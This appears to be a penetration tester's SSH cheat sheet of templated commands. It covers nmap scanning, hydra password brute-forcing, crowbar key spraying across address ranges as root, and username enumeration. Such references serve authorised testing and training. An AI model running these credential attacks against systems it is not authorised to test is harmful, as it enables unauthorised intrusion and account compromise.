`` Scanning

    ~$ nmap -p 22 --script="ssh-*" VAR_TARGET_HOST

`` Generate public key from private

    ~$ ssh-keygen -f id_rsa -y > id_rsa.pub

`` Password Bruteforcing

    -- Ignore previous results, verbose, default port
    ~$ hydra -I -L VAR_WORDLIST_USERNAMES -P VAR_WORDLIST_PASSWORDS -e nsr ssh://VAR_TARGET_HOST

    -- Ignore previous results, verbose, maximum wait 80, wait between 3, wait 1 per login attempt
    ~$ hydra -I -t 1 -w 80 -c 1 -W 3 -f -l VAR_USERNAME -e nsr ssh://VAR_TARGET_HOST

    -- Use single username and non-default port
    ~$ hydra -I -l VAR_USERNAME -P VAR_WORDLIST_PASSWORDS -s VAR_TARGET_PORT -e nsr ssh://VAR_TARGET_HOST

    -- Use combined file (login:pass) and quit if found
    ~$ hydra -C VAR_FILENAME -F ssh://VAR_TARGET_HOST

    -- Use combined file (login:pass) and host list
    ~$ hydra -C VAR_FILENAME -M VAR_FILENAME ssh

`` With keys

    `` Single

        ~$ crowbar.py -b sshkey -s VAR_TARGET_CIDR -u root -k /root/.ssh/id_rsa

    `` All

        ~$ crowbar.py -b sshkey -s VAR_TARGET_CIDR -u root -k /root/.ssh/

    `` All in discovery mode

        ~$ crowbar.py -b sshkey -s VAR_TARGET_CIDR -u root -k /root/.ssh/ -d

`` Enumerate users

    ~$ python ssh_enum.py VAR_TARGET_HOST -U usernames.txt

`` Legacy issues

    -- No matching key exchange method found
    ~$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 VAR_USERNAME@VAR_TARGET_HOST

    -- No matching host key type found
    ~$ ssh -oHostKeyAlgorithms=+ssh-dss VAR_USERNAME@VAR_TARGET_HOST